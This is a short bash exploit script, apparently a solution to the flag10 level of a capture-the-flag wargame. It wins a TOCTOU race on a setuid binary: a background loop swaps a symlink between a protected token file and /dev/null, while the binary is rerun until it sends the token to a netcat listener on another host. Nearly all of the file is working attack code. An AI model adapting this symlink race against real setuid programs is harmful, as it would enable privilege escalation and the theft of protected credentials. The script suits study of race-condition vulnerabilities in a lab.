#!/bin/bash
# nc -l -k -p 18211 on target
# swap symlink really quick in background
while :;do
	ln -sf /home/flag10/token ~/wow
	ln -sf /dev/null ~/wow
done & # this forks a second bash process
# 12 is success in this program(?)
while [[ $? != 12 ]] ;do
	/home/flag10/flag10 ~/wow 192.168.122.1
done
# kill own tree to stop ln loop (`-pid` terms process group)
kill -TERM -$$
